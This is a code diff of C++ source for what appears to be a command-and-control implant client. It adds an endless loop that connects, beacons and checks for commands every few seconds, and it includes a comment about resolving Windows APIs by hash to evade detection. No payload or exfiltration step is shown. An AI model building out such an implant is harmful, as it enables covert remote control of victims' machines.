@@ -50,7 +50,7 @@ Client::Client(C2ProfileUniquePtr config) :
 
 }
 */
-
+/*
 Client::Client(
 		//Compressor& compressor, 
 		Encryptor& encryptor, 
@@ -66,24 +66,35 @@ Client::Client(
 {
 
 }
+*/
 
-bool Client::run(const char* host, const char* port)
-{
 
-	return true;
+
+
+bool Client::run()
+{	
 	//Config* config = loadConfig();
 	//Config config = loadConfig();
 
-    // 1. manually resolve apis
-    /*
-    TODO: 
-    would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have 
-    to loop through the array of functions every single time?
+	// 1. manually resolve apis
+	/*
+	TODO:
+	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
+	to loop through the array of functions every single time?
 
-    something like this:
-    resolve_all_functions(dll_base, hashes, pointers, count);
+	something like this:
+	resolve_all_functions(dll_base, hashes, pointers, count);
 
-    not sure if this is worth doing for dlls/modules tho
-    
-    */
+	not sure if this is worth doing for dlls/modules tho
+
+	*/
+
+
+	while (true)
+	{
+		transporter_.connect();    // Try to connect (handles if already connected)
+		transporter_.beacon();     // Send heartbeat + check commands
+		Sleep(5000);            // Wait 1 minute
+	}
+	return false;
 }
